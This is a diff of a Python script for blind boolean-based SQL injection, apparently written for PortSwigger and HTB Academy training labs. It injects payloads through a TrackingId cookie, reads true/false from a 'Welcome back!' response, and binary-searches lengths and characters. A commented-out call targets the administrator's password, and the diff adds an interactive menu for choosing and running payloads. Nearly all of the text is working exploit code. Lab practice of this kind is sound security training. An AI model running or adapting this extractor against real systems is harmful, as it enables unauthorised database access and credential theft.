@@ -15,7 +15,7 @@ def oracle(q):
         "TrackingId": payload
     }
     response = requests.get(url(),cookies=cookies)
-    return "Welcome back!" in response.text
+    return "Welcome back!" in response.text  # Observe the response, and modify it
 
 # Calculate the Length
 def dumpNumber(q):
@@ -29,7 +29,7 @@ def dumpNumber(q):
             low = mid + 1
     return low
 
-# dumping string
+# Dumping string
 def dumpString(q, length):
     val = ""
     for i in range(1, length+1):
@@ -41,6 +41,21 @@ def dumpString(q, length):
     return val
 
 #for portswigger lab
-length=dump_length("password")
-print(length)
-print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
+#length=dump_length("password")
+#print(length)
+#print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
+
+func = int(input("""HTB_ACADEMY_ORACLE
+(1) Get Length
+(2) Get Name
+Your Option : """))
+
+if func == 0:
+    test()
+elif func == 1:
+    payload = input("Payload : ")
+    print(dumpNumber(payload))
+elif func == 2:
+    payload = input("Payload : ")
+    string,length=payload.rsplit(maxsplit=1)
+    print(dumpString(string,int(length)))
